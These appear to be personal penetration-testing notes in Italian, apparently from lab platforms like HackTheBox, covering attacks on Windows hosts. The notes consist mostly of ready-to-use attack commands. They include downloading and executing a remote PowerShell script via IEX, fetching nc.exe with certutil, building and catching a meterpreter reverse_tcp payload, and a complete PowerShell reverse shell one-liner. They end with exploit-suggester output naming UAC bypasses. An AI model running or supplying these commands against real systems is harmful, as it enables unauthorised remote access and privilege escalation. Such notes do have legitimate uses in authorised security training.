# Windows

## file transfer

### HTTP
host: 
```
python -m http.server 9000
```

vittima:
```
wget http://10.10.14.14:9000/file -o .
```
o con
```
certutil -urlcache -f http://10.10.14.23/nc.exe nc.exe
```

o con:
```
IEX(New-Object Net.WebCLient).DownloadString('http://10.10.14.19:9000/rev.ps1')
```

### FTP
host:
```
python -m pyftpdlib -p 21
```

vittima:
```
ftp 10.10.14.14
```

### SMB
host:
```
impacket-smbserver ciao .
```

vittima:
```
copy \\10.10.14.14\ciao\file.exe .
```

https://blog.ropnop.com/transferring-files-from-kali-to-windows/


## reverse shell 

### meterpreter
host: creare reverse shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 -f exe -o /home/kali/Desktop/rs_exploitl.exe
```

vittima: eseguire la shell 
host:
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.14
set LPORT 4444
exploit
```

 https://johndcyber.com/how-to-create-a-reverse-tcp-shell-windows-executable-using-metasploit-56d049007047

### nishang 

```
powershell -command "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
https://github.com/samratashok/nishang

## Privilege escalation

### meterpreter
Ottenere una sessione meterpreter con il metodo sopra.

```
meterpreter > background 
[*] Backgrounding session 4...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) >
```


```
msf6 post(multi/recon/local_exploit_suggester) > set session 4
session => 4
```

```
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.11.106 - Collecting local exploits for x64/windows...
[*] 10.10.11.106 - 28 exploit checks are being tried...
[+] 10.10.11.106 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/ricoh_driver_privesc: The target appears to be vulnerable. Ricoh driver directory has full permissions
[+] 10.10.11.106 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Post module execution completed
```
